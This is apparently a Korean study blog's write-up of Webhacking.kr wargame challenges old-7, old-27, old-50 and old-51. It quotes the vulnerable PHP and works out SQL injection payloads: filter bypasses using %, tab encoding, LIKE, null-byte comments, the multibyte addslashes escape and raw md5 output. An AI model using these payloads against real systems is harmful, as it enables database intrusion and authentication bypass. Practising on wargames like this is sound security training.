---
layout: default
title: Day64
nav_order: 5

parent: Hacking Project - W9
grand_parent: P4C
---

##### 해당 게시글은 빡공팟 4기(with TeamH4C)와 관련되어 있습니다

-----

# > Webhacking.kr:old-7

## 삽질

```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 7</title>
</head>
<body>
<?php
$go=$_GET['val'];
if(!$go) { echo("<meta http-equiv=refresh content=0;url=index.php?val=1>"); }
echo("<html><head><title>admin page</title></head><body bgcolor='black'><font size=2 color=gray><b><h3>Admin page</h3></b><p>");
if(preg_match("/2|-|\+|from|_|=|\\s|\*|\//i",$go)) exit("Access Denied!");
$db = dbconnect();
$rand=rand(1,5);
if($rand==1){
  $result=mysqli_query($db,"select lv from chall7 where lv=($go)") or die("nice try!");
}
if($rand==2){
  $result=mysqli_query($db,"select lv from chall7 where lv=(($go))") or die("nice try!");
}
if($rand==3){
  $result=mysqli_query($db,"select lv from chall7 where lv=((($go)))") or die("nice try!");
}
if($rand==4){
  $result=mysqli_query($db,"select lv from chall7 where lv=(((($go))))") or die("nice try!");
}
if($rand==5){
  $result=mysqli_query($db,"select lv from chall7 where lv=((((($go)))))") or die("nice try!");
}
$data=mysqli_fetch_array($result);
if(!$data[0]) { echo("query error"); exit(); }
if($data[0]==1){
  echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=\"alert('Access_Denied!')\"><p>");
}
elseif($data[0]==2){
  echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=\"alert('Hello admin')\"><p>");
  solve(7);
}
?>
<a href=./?view_source=1>view-source</a>
</body>
</html>
```

결과부터 이야기하면 쿼리의 결과가 "2"로 나왔을 때 문제가 풀리는 듯한데, 방해하는 요소가 꽤 있다. 먼저 값을 전달하기 위해선 `var` 파라미터를 통해야하는데 2를 못만들게 하기위해 필터링이 걸려있다. 또한 `$rand` 를 통해 랜덤한 값에 따라 쿼리문을 날릴 때 괄호의 갯수가 증가하는데 이게 어떠한 것을 의미하는지는 알아봐야할 듯하다.

먼저 정규표현식으로 제한되는 기호는 아래와 같다.

![image-20220620112005296](..//img/image-20220620112005296.png)

대부분의 연산을 막아놨던데 나머지 연산자 `%`는 남아있길래 php에서도 존재하는지 찾아보았다. 다행이 존재하여 시도해보았는데 "query error"가 떴고, 이러면 2라는 컬럼이 애초에 없는게 아닌가 하는 생각이 들었다.

```
?val=5%3
```
그렇다면 `select 2`을 하면 쿼리의 결과가 2가 나온다는 것을 알기에 union을 이용해서 시도해봐야겠다. 아마도 20%의 확률로 rand가 1일 경우에 `()`기호가 1개 인점을 이용해서 쿼리문을 짜야할듯하다.

```
) union select (5%3
```
을 시도했는데 계속 "Access Denied! 가 발생한다. 아니 왜 필터링이 걸리는지 싶어서 다시 찾아보았다.

찾아보니 정규표현식에서 `\S`는 non space의 의미로 공백 문자가 없어야 한다고 한다 ㅋㅋㅋㅋㅋㅋ

<br>

## writeup

문제에서는 `var`의 값이 2가 되도록 전송을 해야하나 기초적인 연산자와 숫자 2의 입력을 막아둔 상태이다. 조금 해매긴 했지만 결국에는 2를 표현하기 위해 나머지 연산자인 `%` 를 이용하는 것이 메인 아이디어 이고,

```
?val=5%3)union(select(5%3)
```

이렇게 괄호로 값을 전달하여 `rand == 1`인 경우에 공격이 성공하도록 값을 전송하면 된다.

![image-20220620165438291](../img/image-20220620165438291.png)

나머지 연산자 `%`를 이용하는 것은 빠르게 떠올렸었는데, 공백 사용이 안된다는 조건을 너무 안일하게 넘어갔었다. 

<br><br><br>

-----

# > Webhacking.kr:old-27

## 삽질

```php
<?php
  if($_GET['no']){
  $db = dbconne/ct();
  if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
  $r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
  if($r['id']=="guest") echo("guest");
  if($r['id']=="admin") solve(27); // admin's no = 2
}
?>
```

문제에서 대문짝만하게 SQL INJECTION이라고 써있는 상태이다. 문제에서 전달하는 쿼리는 `select id from chall27 where id='guest' and no=({$_GET['no']})` 로 사용자가 전달하는 인자는 괄호 안에 묶이게 된다. 또한 `(`와 `#` 등과 같이 괄호를 탈출하거나 무시하기 위한 기호들은 막혀있는 상태이다.

<br>

## writeup

위 조건들을 하나 하나 곱씹어서 우회하고자 하면,

1. 공백은 `%09`를 통해 우회할 수 있다.
2. `#`와 `(` 기호/의 막힘은 `;%00`으로 뒷 내용들을 전부 주석처리 해버리면 된다.
3. `=` 기호의 막힘은 문자 비교 시에 사용하는 LIKE 절로 대체 가능하다.
4. `or` 연산은 논리 연산들 중에서 가장 늦게 적용이 된다.

이들을 모두 결합해보면 아래와 같은 값을 `no`의 인자 값으로 보내면 된다.

```
3)%09or%09id%09like%09%27admin%27;%00
```

해석하면 아래와 같으므로 풀리겠다!

```
3) or id like 'admin';
```

![image-20220620171004378](../img/image-20220620171004378.png)

<br><br><br>

-----

# > Webhacking.kr:old-50

## 삽질

점수에 쫄아서 다음꺼부터!

'22.06.27
{: .text-red-000}

```php
<?php
  if($_GET['id'] && $_GET['pw']){
    $db = dbconnect();
    $_GET['id'] = addslashes($_GET['id']); 
    $_GET['pw'] = addslashes($_GET['pw']);
    $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr');
    foreach($_GET as $ck) if(preg_match("/from|pw|\(|\)| |%|=|>|</i",$ck)) exit();
    if(preg_match("/union/i",$_GET['id'])) exit();
    $result = mysqli_fetch_array(mysqli_query($db,"select lv from chall50 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
    if($result){
      if($result['lv']==1) echo("level : 1<br><br>");
      if($result['lv']==2) echo("level : 2<br><br>");
    } 
    if($result['lv']=="3") solve(50);
    if(!$result) echo("Wrong");
  }
?>
```

풀려면 쿼리의 결과가 "3"이 나오도록 만들면 되는 문제인데, 필터링이 꽤 있어보인다.

`mb_convert_encoding` 함수를 몰라서 인터넷에 쳐봤는데 왠걸? 이 함수의 취약점이 연관검색어로 떴다. 이 부분을 이용하는 듯하니 확인해보았다.

한글과 같이 멀티바이트(2바이트)를 사용하는 언어셋 환경에서 백슬래시 앞에 %a1~%fe의 값이 들어오면 백슬래시를 먹은 채 하나의 문자(1바이트)로 인식한다고 한다. 즉, `addslash`와 같은 함수로 인해 추가된 백슬래쉬를 이 취약점을 통해 먹어서 없애버릴 수 있다.

음 근데 `%` 기호가 막혀있다. 

음 근데 `mb_conver_encoding` 함수 이후니까 문제없을 지도? ㅋㅋㅋ

```
'|| lv='3'#
=> %a1%27||%09lv%09like%09%bf%273%bf%27%23
```

`#` 기호를 url 창에 넣으면 안되서 '%23'으로 대체하였다. lv 값이 3인 결과를 가져올 수 있도록 이렇게 전달을 했는데, "Wrong"이 출력되었다.

이 말이 무엇이냐, 대충 이러한 방식으로 풀면 되는 것인데, 머리를 좀 더 써야 한다. `union` 구문을 필터링 했지만 'union select 3#' 을 이용하지 않으면 가능성이 보이지 않는다. union을 쓸려면 `md()`로 감싸진 것을 풀어헤쳐야 하는데...

lv 값을 구하는 시도 이후에 쿼터와 같은 기호를 `addslashes()`  피하면서 넣을 수 있는 방법을 알았다. 그럼 없애고 싶은 부분을 주석 처리를 해보면 어떤가. 한 줄 자체를 주석처리 하는 것은 `#` 기호 뒤이고, 부분적으로는 `/**/` 이 있다. 그리고 나는 id와 pw란에 각각 값을 넣으니, 중간에 사라졌으면 하는 `md5()`를 없애버린다면,,,?

```
id=/*
pw=*/' union select 3#
=> %2f%2a
=> %2a%2f%a1%27%%09union%09select%093%23
id=%2f%2a&pw=%2a%2f%a1%27%09union%09select%093%23
```

아니 어째서인지 안된다

```php
"select lv from chall50 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"
=> "select lv from chall50 where id='/*' and pw=md5('*/'union select 3#')"
=> "select lv from chall50 where id='/**/'union select 3#')"
```

이 방법 외에 진짜 모르겠어서 답지를 찔끔만 볼려고 했는데, 

```
id='/*
pw=*/ union select 3#
id=%a1%27%2f%2a&pw=%2a%2f%09union%09select%093%23
```

전자처럼 해버리면 `'  '` 사이에 `/**/` 기호가 문자열 자체로 인식되서 "Wrong"이 뜨는 듯하다.

3일 걸린 게 웃기다 ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ

![image-20220629220531070](../img/image-20220629220531070.png)

<br><br><br>

-----

# > Webhacking.kr:old-51

## 삽질

```php
<?php
  if($_POST['id'] && $_POST['pw']){
    $db = dbconnect();
    $input_id = addslashes($_POST['id']);
    $input_pw = md5($_POST['pw'],true);
    $result = mysqli_fetch_array(mysqli_query($db,"select id from chall51 where id='{$input_id}' and pw='{$input_pw}'"));
    if($result['id']) solve(51);
    if(!$result['id']) echo "<center><font color=green><h1>Wrong</h1></font></center>";
  }
?>
```

어떠한 계정으로든 로그인이 되기만 하면 되는데 따옴표가 붙으면 알아서 이스케이프 문자를 붙여주는 `addslashes` 함수와 입력값을 암호화하는 `md5`를 이용해서 사용자 입력들이 변환되어 버린다.


전송되는 쿼리문을 생각해보면

```
select id from chall51 where id='입력id' and pw='md5(입력pw)'
```

`addslashes`에 의해 `'`사용에 제약적인 것을 빼면 모든 것이 사용가능하다. 그렇다면 나도 이스케이프문자를 넣음으로써 `'` 삽입 시 적용되는 이스케이프 문자를 이스케이프 시켜버린다면..? -> 안되길래 php 컴파일러로 시도해보니 `\\` 기호 앞에도 `\\`가 붙어버린다. 이건 몰랐지!

다른 방법을 생각해보다 `md5()` 에 취약한 점이 있는지 찾아보려고 구글링을 해봤는데 대부분이 이 문제에 대한 라업으로 이어져있었다.  일단 md5의 문법을 찾아보았는데 두 번째 인자가 `bool $raw_output`에 대한 'true' or 'false' 였다. default 값은 'false'이기에 별도로 지정하지 않으면 `md5()`의 결과는 32자리의 문자열을 반환한다. 하지만 만약에 'true'로 설정한다는 16바이트의 바이너리 형식으로 반환한다고 한다.

즉시 어떤 형태인지 눈으로 확인해보고자 온라인 컴파일러로 결과를 봤다.

![image-20220620173703254](../img/image-20220620173703254.png)

그러니까 'true'로 설정되어있으면 알파벳들이 출력하능하다는 것이고, 어찌저찌 pw에서도 문장만 잘 날리면 `md5()`를 거쳐 문제를 풀기위한 형태로 수정할 수 있다는 것이다.


<br>

## writeup

id 란에서 탈출하기가 어렵다고 판단되어 취약한 함수가 존재하는 pw 란으로 타겟을 변경했다.

`'or`뒤에 어떠한 문자라도 나오도록하는 값이 있는지 찾아보면 되겠다.

![image-20220620174656978](../img/image-20220620174656978.png)

md5 sql injection이라는 검색어로 검색했더니 나왔다.

![image-20220620174716977](../img/image-20220620174716977.png)
